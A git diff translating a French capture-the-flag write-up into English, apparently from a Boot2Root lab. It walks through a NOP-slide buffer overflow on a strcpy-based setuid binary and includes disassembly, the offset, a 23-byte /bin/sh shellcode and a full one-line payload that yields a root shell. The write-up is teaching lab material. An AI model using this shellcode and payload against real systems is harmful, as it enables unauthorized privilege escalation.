@@ -1,6 +1,6 @@
 # Buffer Overflow Nopslide exploit
 
-A partir de **zaz**, on reprend le binaire **exploit_me** que l'on avait exploiter dans le [writeup1](https://github.com/ChokMania/Boot2Root/blob/master/writeup1.md) :
+From **zaz**, we take the binary **exploit_me** that we had exploited in the [writeup1](https://github.com/ChokMania/Boot2Root/blob/master/writeup1_en.md) :
 
 ```
 gdb -q ./exploit_me
@@ -30,24 +30,24 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 <pre><code>0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)</code></pre>
->Le compare nous indique que le programme attend 1 seul argument.
+> The comparison tells us that the program expects only 1 argument.
 ```
 0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
 ```
->strcpy copie et stocke notre premier argument dans la stack sans vérifier si la taille de l'argument correspond à celle du buffer de destination.
+> **strcpy** copies and stores our first argument in the stack without checking if the size of the argument matches the size of the destination buffer.
 
-La fonction est donc exploitable par <code>buffer_overflow</code> pour corrompre les valeurs sauvegardées de **%ebp** et **%eip**.
+The function is therefore exploitable by <code>buffer_overflow</code> to corrupt the saved values of **%ebp** and **%eip**.
 
-On va effectuer une **nopslide attack**, qui consiste a placer un **SHELLCODE**, executant un **"shell"** ou une autre fonction, au milieu d'une **slide de nop** (**"\x90"**).
-> L'instruction **nop** n'a comme seul but de passer a l'instruction suivante.
+We will perform a **nopslide attack**, which consists in placing a **SHELLCODE**, executing a **"shell "** or another function, in the middle of a **nopslide** (**"\x90"**).
+> The **nop** instruction has as sole purpose to go to the next instruction.
 
-On connait l'adresse du buffer qui est :
+We know the address of the buffer which is :
 
 <code>0xbffff640</code>
 
-On connait l'**offset**, auquel on ecrase **%eip**, qui est de 140 et possede une taille de 4.
+We know the **offset**, to which we crush **%eip**, which is 140 and has a size of 4.
 
-On utilse le **SHELLCODE** 23 bytes, génerer de la maniere suivante :
+We use the **SHELLCODE** 23 bytes, generate in the following way :
 
 ### <span>script.sh</span>
 ```bash
@@ -106,12 +106,12 @@ shellcode:
 lenght = 0x17 // 23
 </code></pre>
 
-On prepare un **PAYLOAD** de 144 charactères, composé de la maniere suivante :
-<pre><code>NOPSLIDE * 60 + SHELLCODE + NOPSLIDE * 57 + Address dans la 1ère NOPSLIDE/code></code></pre>
+We prepare a 144 characters **PAYLOAD**, composed as follows :
+<pre><code>NOPSLIDE * 60 + SHELLCODE + NOPSLIDE * 57 + Address in 1st NOPSLIDE/code></code></pre>
 
 <pre><code>./exploit_me `python -c "print '\x90'*60 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x90'*57 + '\x50\xf6\xff\xbf'"`</code></pre>
 
-Nous obtenons un terminal avec les droits **root** :
+We get a terminal with **root** rights :
 ```
 > id
 uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
